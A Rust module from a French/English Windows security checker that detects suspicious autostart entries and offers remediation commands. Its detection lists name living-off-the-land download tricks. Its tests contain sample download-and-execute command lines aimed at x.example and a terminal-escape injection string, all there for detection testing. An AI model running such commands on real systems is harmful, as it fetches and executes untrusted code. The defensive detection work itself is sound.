//! Ce qui se lance tout seul sous Windows : tâches planifiées, clés Run et RunOnce, dossiers Démarrage.

use super::*;
use crate::commande::decouper_commande;

/// Pourquoi ce programme lancé automatiquement (tâche planifiée, clé Run, dossier Démarrage) ressemble à un
/// malware, ou `None`. Seules des formes précises sont retenues : les programmes installés normalement n'y tombent pas.
pub(super) fn lancement_suspect(exe: &str, args: &str) -> Option<&'static str> {
    let exe = exe.trim().trim_matches('"').to_lowercase().replace('/', "\\");
    let args = args.to_lowercase();
    let tout = format!("{exe} {args}");
    let temporaire = |t: &str| {
        ["\\appdata\\local\\temp\\", "%temp%", "%tmp%", "\\windows\\temp\\"]
            .iter()
            .any(|d| t.contains(d))
    };
    let public = |t: &str| {
        ["\\users\\public\\", "\\$recycle.bin\\", "%public%"]
            .iter()
            .any(|d| t.contains(d))
    };
    let programme = exe.rsplit('\\').next().unwrap_or(&exe).trim_end_matches(".exe");
    if temporaire(&exe) {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    if public(&exe) {
        return Some(tr!(
            "programme rangé dans le dossier Public ou la corbeille",
            "program stored in the Public folder or the recycle bin"
        ));
    }
    let jetons: Vec<String> = args
        .split_whitespace()
        .map(|j| j.trim_matches('"').replacen('/', "-", 1))
        .collect();
    let a = |m: &str| jetons.iter().any(|j| j == m);
    match programme {
        "powershell" | "pwsh" => {
            let cache = jetons.iter().any(|j| {
                j == "-e" || j == "-ec" || (j.starts_with("-en") && "-encodedcommand".starts_with(j.as_str()))
            });
            if cache {
                return Some(tr!(
                    "commande PowerShell cachée en base64",
                    "PowerShell command hidden in base64"
                ));
            }
            let execute = ["iex", "invoke-expression"].iter().any(|m| args.contains(m));
            let telecharge = [
                "downloadstring",
                "downloadfile",
                "invoke-webrequest",
                "iwr ",
                "net.webclient",
                "invoke-restmethod",
                "irm ",
            ]
            .iter()
            .any(|m| args.contains(m));
            if execute && telecharge {
                return Some(tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                ));
            }
        }
        "mshta"
            if ["http:", "https:", "javascript:", "vbscript:"]
                .iter()
                .any(|m| args.contains(m)) =>
        {
            return Some(tr!(
                "mshta lance un script venu d'Internet",
                "mshta runs a script from the Internet"
            ));
        }
        "regsvr32" if args.contains("scrobj.dll") || args.contains("-i:http") || args.contains("/i:http") => {
            return Some(tr!(
                "regsvr32 charge un script distant",
                "regsvr32 loads a remote script"
            ));
        }
        "rundll32" if args.contains("javascript:") => {
            return Some(tr!("rundll32 exécute du JavaScript", "rundll32 runs JavaScript"));
        }
        "certutil" if a("-urlcache") || a("-decode") => {
            return Some(tr!(
                "certutil détourné pour télécharger ou décoder un fichier",
                "certutil misused to download or decode a file"
            ));
        }
        "bitsadmin" if a("-transfer") => {
            return Some(tr!(
                "bitsadmin détourné pour télécharger un fichier",
                "bitsadmin misused to download a file"
            ));
        }
        _ => {}
    }
    // Interpréteurs et outils système qui lancent un script ou une bibliothèque rangés dans un dossier temporaire ou public.
    let relais = [
        "wscript",
        "cscript",
        "mshta",
        "rundll32",
        "regsvr32",
        "cmd",
        "powershell",
        "pwsh",
    ];
    if relais.contains(&programme) && (temporaire(&tout) || public(&tout)) {
        return Some(tr!(
            "script ou bibliothèque lancé depuis un dossier temporaire ou public",
            "script or library started from a temporary or public folder"
        ));
    }
    if ["wscript", "cscript"].contains(&programme) && args.contains("\\appdata\\") {
        return Some(tr!(
            "script caché dans les données d'application, lancé automatiquement",
            "script hidden in application data, started automatically"
        ));
    }
    None
}

/// Ce qui se lance tout seul hors de Windows : tâches planifiées (hors \Microsoft\), clés Run et RunOnce,
/// dossiers Démarrage. Une seule lecture PowerShell, en sections.
pub(super) fn persistance() -> Vec<Constat> {
    let sortie = ps(
        "try { Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' -and $_.TaskPath -notlike '\\Microsoft\\*' } | ForEach-Object { $t = $_; \
         $t.Actions | Where-Object { $_.Execute } | ForEach-Object { \"TCH|$($t.TaskPath)|$($t.TaskName)|$($_.Execute)|$($_.Arguments)\" } }; 'TCH_FIN' } catch {}; \
         try { foreach ($c in 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce', \
         'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce', \
         'HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run') { $p = Get-ItemProperty $c -ErrorAction SilentlyContinue; \
         if ($p) { $p.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object { \"RUN|$c|$($_.Name)|$($_.Value)\" } } }; 'RUN_FIN' } catch {}; \
         try { $w = New-Object -ComObject WScript.Shell; foreach ($d in [Environment]::GetFolderPath('Startup'), [Environment]::GetFolderPath('CommonStartup')) { \
         Get-ChildItem $d -File -ErrorAction SilentlyContinue | Where-Object Name -ne 'desktop.ini' | ForEach-Object { \
         $cible = if ($_.Extension -eq '.lnk') { $r = $w.CreateShortcut($_.FullName); '\"' + $r.TargetPath + '\" ' + $r.Arguments } else { '\"' + $_.FullName + '\"' }; \
         \"DEM|$($_.FullName)|$cible\" } }; 'DEM_FIN' } catch {}",
    );
    let taches = section(sortie.as_deref(), "TCH");
    let run = section(sortie.as_deref(), "RUN");
    let demarrage = section(sortie.as_deref(), "DEM");
    if taches.is_none() && run.is_none() && demarrage.is_none() {
        return vec![illisible("Persistance")];
    }
    juger_persistance(
        &taches.unwrap_or_default(),
        &run.unwrap_or_default(),
        &demarrage.unwrap_or_default(),
    )
}

fn juger_persistance(taches: &[&str], run: &[&str], demarrage: &[&str]) -> Vec<Constat> {
    let ps_texte = crate::commande::ps_texte;
    // Noms, chemins et commandes sont choisis par le programme qui se fait relancer : les corrections visent le vrai
    // nom, les messages le montrent rendu inoffensif.
    let montre = crate::ui::affichable;
    let mut constats = Vec::new();
    for t in taches {
        let c: Vec<&str> = t.trim().splitn(4, '|').collect();
        let [chemin_brut, nom_brut, exe_brut, args_brut] = c[..] else {
            continue;
        };
        if let Some(raison) = lancement_suspect(exe_brut, args_brut) {
            let (chemin, nom, exe, args) = (
                montre(chemin_brut),
                montre(nom_brut),
                montre(exe_brut),
                montre(args_brut),
            );
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Tâche planifiée suspecte « {chemin}{nom} » : {raison} ({exe} {args}).",
                        "Suspicious scheduled task “{chemin}{nom}”: {raison} ({exe} {args})."
                    ),
                )
                .corriger(
                    trf!(
                        "Désactiver la tâche « {nom} » (réactivable)",
                        "Disable the “{nom}” task (can be turned back on)"
                    ),
                    &[&format!(
                        "Disable-ScheduledTask -TaskPath '{}' -TaskName '{}' | Out-Null",
                        ps_texte(chemin_brut),
                        ps_texte(nom_brut)
                    )],
                ),
            );
        }
    }
    for r in run {
        let c: Vec<&str> = r.trim().splitn(3, '|').collect();
        let [cle_brute, nom_brut, valeur_brute] = c[..] else {
            continue;
        };
        let (exe, args) = decouper_commande(valeur_brute);
        if let Some(raison) = lancement_suspect(&exe, &args) {
            let (cle, nom, valeur) = (montre(cle_brute), montre(nom_brut), montre(valeur_brute));
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Lancement automatique suspect « {nom} » ({cle}) : {raison} ({valeur}).",
                        "Suspicious autostart “{nom}” ({cle}): {raison} ({valeur})."
                    ),
                )
                .corriger(
                    trf!("Retirer « {nom} » du démarrage", "Remove “{nom}” from startup"),
                    &[&format!(
                        "Remove-ItemProperty -Path '{}' -Name '{}'",
                        ps_texte(cle_brute),
                        ps_texte(nom_brut)
                    )],
                ),
            );
        }
    }
    for d in demarrage {
        let Some((fichier_brut, cible_brute)) = d.trim().split_once('|') else {
            continue;
        };
        let (exe, args) = decouper_commande(cible_brute);
        if let Some(raison) = lancement_suspect(&exe, &args) {
            let (fichier, cible) = (montre(fichier_brut), montre(cible_brute));
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Raccourci suspect dans le dossier Démarrage « {fichier} » : {raison} ({cible}).",
                        "Suspicious shortcut in the Startup folder “{fichier}”: {raison} ({cible})."
                    ),
                )
                .corriger(
                    trf!("Supprimer « {fichier} »", "Delete “{fichier}”"),
                    &[&format!("Remove-Item -LiteralPath '{}'", ps_texte(fichier_brut))],
                ),
            );
        }
    }
    if constats.is_empty() {
        constats.push(ok(
            "Persistance",
            trf!(
                "{} tâche(s) planifiée(s) hors Microsoft et {} programme(s) au démarrage, aucun suspect.",
                "{} non-Microsoft scheduled task(s) and {} startup program(s), none suspicious.",
                taches.len(),
                run.len() + demarrage.len()
            ),
        ));
    }
    constats
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lancements_suspects() {
        let s = |ligne: &str| {
            let (exe, args) = decouper_commande(ligne);
            lancement_suspect(&exe, &args).is_some()
        };
        // Programmes installés normalement : rien à signaler.
        assert!(!s(r#""C:\Program Files\Steam\steam.exe" -silent"#));
        assert!(!s(
            r"C:\Users\alice\AppData\Local\Discord\Update.exe --processStart Discord.exe"
        ));
        assert!(!s(r"C:\Program Files\Mozilla Firefox\firefox.exe -os-autostart"));
        assert!(!s(
            r#""C:\Program Files\PowerShell\7\pwsh.exe" -ExecutionPolicy Bypass -File C:\Scripts\sauvegarde.ps1"#
        ));
        assert!(!s(r"%windir%\system32\rundll32.exe printui.dll,PrintUIEntry"));
        // Formes de malware.
        assert!(s(r"C:\Users\alice\AppData\Local\Temp\svch0st.exe"));
        assert!(s(r"C:\Users\Public\update.exe /q"));
        assert!(s(
            r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        ));
        assert!(s(r"powershell -e SQBFAFgA"));
        assert!(s(r"powershell.exe /EncodedCommand SQBFAFgA"));
        assert!(s(
            r#"powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')""#
        ));
        assert!(s(r"mshta.exe https://x.example/a.hta"));
        assert!(s(r"regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll"));
        assert!(s(r"certutil.exe -urlcache -split -f http://x.example/a.exe a.exe"));
        assert!(s(r"wscript.exe C:\Users\alice\AppData\Roaming\x\run.vbs"));
        assert!(s(r"rundll32.exe C:\Users\alice\AppData\Local\Temp\a.dll,Start"));
        assert_eq!(
            decouper_commande(r"C:\Program Files\App\app.exe /min"),
            (r"C:\Program Files\App\app.exe".to_string(), "/min".to_string())
        );
    }

    #[test]
    fn persistance_jugee() {
        let taches = [
            r"\|Mise a jour|C:\Users\alice\AppData\Local\Temp\a.exe|",
            r"\Mozilla\|Firefox Default Browser Agent|C:\Program Files\Mozilla Firefox\default-browser-agent.exe|do-task",
        ];
        let c = juger_persistance(&taches, &[], &[]);
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].probleme, Some(Niveau::Eleve));
        assert!(
            c[0].correctif.as_ref().unwrap().commandes[0]
                .contains("Disable-ScheduledTask -TaskPath '\\' -TaskName 'Mise a jour'")
        );
        let run = [
            r#"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|Steam|"C:\Program Files (x86)\Steam\steam.exe" -silent"#,
        ];
        let c = juger_persistance(&[], &run, &[]);
        assert!(c.len() == 1 && c[0].probleme.is_none());
        // Nom de tâche, valeur Run et raccourci choisis par le programme qui les pose : montrés inoffensifs, mais la
        // correction vise le vrai nom.
        let piege = "Maj\x1b]52;c;eA==\x07\x1b[2K\r\u{202e}";
        let taches = [format!(r"\|{piege}|C:\Users\alice\AppData\Local\Temp\a.exe|")];
        let run = [format!(
            r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|{piege}|C:\Users\Public\b.exe"
        )];
        let dem = [format!(
            r"C:\Users\alice\Start Menu\Programs\Startup\{piege}.lnk|C:\Users\Public\c.exe"
        )];
        let (taches, run, dem): (Vec<&str>, Vec<&str>, Vec<&str>) = (
            taches.iter().map(String::as_str).collect(),
            run.iter().map(String::as_str).collect(),
            dem.iter().map(String::as_str).collect(),
        );
        let c = juger_persistance(&taches, &run, &dem);
        assert_eq!(c.len(), 3);
        for c in &c {
            let k = c.correctif.as_ref().unwrap();
            assert!(!crate::ui::contient_un_piege(&c.message), "{}", c.message);
            assert!(!crate::ui::contient_un_piege(&k.action), "{}", k.action);
            assert!(k.commandes[0].contains(piege), "{}", k.commandes[0]);
        }
    }
}
